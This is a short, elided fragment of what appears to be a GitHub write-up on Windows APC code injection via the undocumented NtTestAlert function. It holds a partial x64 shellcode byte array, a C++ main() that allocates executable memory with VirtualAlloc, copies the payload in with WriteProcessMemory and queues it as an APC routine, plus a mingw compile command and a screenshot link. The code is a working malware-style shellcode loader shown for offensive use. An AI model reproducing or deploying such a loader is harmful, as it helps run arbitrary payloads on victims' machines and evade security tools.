...
***undocumented function: NtTestAlert***
...
unsigned char payload[] = "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
	...
	"\x18\x49\x01\xd0\x50\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41"
	...
	"\x2e\x2e\x2e\x2e\x21\x21\x21\x00\x5a\xe8\x0a\x00\x00\x00"
	"\x66\x72\x6f\x6d\x20\x4b\x41\x4e\x54\x00\x41\x58\x48\x31"
	"\xc9\x41\xba\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba"
...
int main(int argc, char* argv[]) {
	...
	LPVOID exec_mem = VirtualAlloc(NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(GetCurrentProcess(),exec_mem, payload, payload_len, NULL);

	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)exec_mem;
...
```bash
x86_64-w64-mingw32-g++ apc_inject.cpp -o apcinject-1.exe 
```

---


<img width="100%" alt="Screenshot 2025-10-15 at 3 17 56 PM" src="https://github.com/user-attachments/assets/c108961a-630d-4f56-813b-c784f565210c" />
